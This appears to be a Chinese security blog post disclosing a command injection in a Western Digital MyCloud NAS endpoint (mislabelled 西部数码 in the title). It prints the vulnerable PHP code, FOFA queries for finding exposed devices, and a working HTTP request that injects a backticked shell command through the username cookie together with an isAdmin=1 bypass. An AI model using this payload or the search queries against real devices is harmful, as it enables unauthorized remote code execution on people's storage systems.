---
title: "西部数码 NAS php/sendLogToSupport.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-sendLogToSupport-rce.html
asset_dir: assets/西部数码-nas-phpsendlogtosupport.php-命令执行漏洞
---

# 西部数码 NAS php/sendLogToSupport.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/3 16:30
* 589浏览
* [0评论](#comment)
* 11分钟阅读

深入探索

漏洞扫描服务

网络安全培训

防火墙软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS sendLogToSupport.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

物流软件安全

安全认证考试

Docker加速服务

直接看 `sendLogToSupport.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$username = $_COOKIE['username'];
exec("wto -n \"$username\" -g", $ret);
```

深入探索

漏洞扫描器

代码安全审计

服务器安全服务

从 `$_COOKIE` 中获取 `username` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 `exec()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

# 漏洞复现

```
GET /web/php/sendLogToSupport.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin`sleep 3`
```

[![西部数码 NAS php/sendLogToSupport.php 命令执行漏洞](images/img-001-81f7391dfb7a.webp)](https://image.mrxn.net/a4cb9901ff544f2c8dfddec375dbd55a.webp)

成功延时 3 秒

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS php/sendLogToSupport.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-sendLogToSupport-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-sendLogToSupport-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-sendLogToSupport-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-sendLogToSupport-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 